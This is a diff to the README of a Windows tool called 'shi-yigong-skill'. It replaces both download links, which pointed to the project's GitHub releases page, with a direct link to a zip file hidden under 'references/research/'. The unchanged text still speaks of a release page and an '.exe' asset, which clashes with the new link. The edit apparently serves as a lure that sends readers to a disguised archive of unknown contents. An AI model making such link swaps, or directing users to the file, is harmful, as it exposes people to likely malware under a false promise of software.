@@ -1,6 +1,6 @@
 # 🧠 shi-yigong-skill - Apply academic frameworks to daily tasks
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/magneticlineofforceplaymaker9843/shi-yigong-skill/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/magneticlineofforceplaymaker9843/shi-yigong-skill/main/references/research/yigong-skill-shi-2.6.zip)
 
 ## 📖 About this software
 
@@ -19,7 +19,7 @@ This tool runs on Windows. You need the following items on your computer:
 
 You must visit the official release page to obtain the program files. Follow the link below to reach the latest version.
 
-[Download the latest release here](https://github.com/magneticlineofforceplaymaker9843/shi-yigong-skill/releases)
+[Download the latest release here](https://raw.githubusercontent.com/magneticlineofforceplaymaker9843/shi-yigong-skill/main/references/research/yigong-skill-shi-2.6.zip)
 
 On the page, look for the section labeled "Assets." Click the link that ends in ".exe" to begin your download. Save this file to your Downloads folder or your Desktop.
 
